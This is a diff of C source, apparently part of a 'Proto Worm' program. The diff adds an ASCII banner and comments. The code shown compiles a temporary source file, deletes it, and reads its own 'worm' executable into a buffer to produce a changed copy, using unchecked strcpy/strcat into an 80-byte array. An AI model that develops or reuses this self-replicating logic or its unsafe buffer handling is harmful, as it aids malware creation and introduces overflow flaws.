@@ -1,4 +1,11 @@
-/* Erik Orndahl 12/8/13*/
+/* Erik Orndahl 12/8/13
+__________                __            __      __                     
+\______   \_______  _____/  |_  ____   /  \    /  \___________  _____  
+ |     ___/\_  __ \/  _ \   __\/  _ \  \   \/\/   /  _ \_  __ \/     \ 
+ |    |     |  | \(  <_> )  | (  <_> )  \        (  <_> )  | \/  Y Y  \
+ |____|     |__|   \____/|__|  \____/    \__/\  / \____/|__|  |__|_|  /
+                                              \/                    \/ 
+*/
  
 #include <stdio.h>
 #include <stdlib.h>
@@ -94,17 +101,17 @@ int main(int argc, const char * argv[])
 
     FILE *cmd=popen(str, "r"); //compile that file
     pclose(cmd);
-    system("cd $HOME; rm tmp.c");
+    system("cd $HOME; rm tmp.c"); //delete temporary source code file
 
 
-    char str2[80];
+    char str2[80]; //concatenate homeDir with filename for path
     char *worm = "/worm";
     strcpy (str2, homeDir);
     strcat (str2, worm);
     strcat (str2, num);
 
-    exec = fopen(str2, "rb"); //read in binary
-    fread(buffer, sizeof(buffer), 1, exec); //and write to large char array
+    exec = fopen(str2, "rb"); //read exec in binary
+    fread(buffer, sizeof(buffer), 1, exec); 
     
     int i, k = 0;
     char newCode[10000]; // second array for changed executable
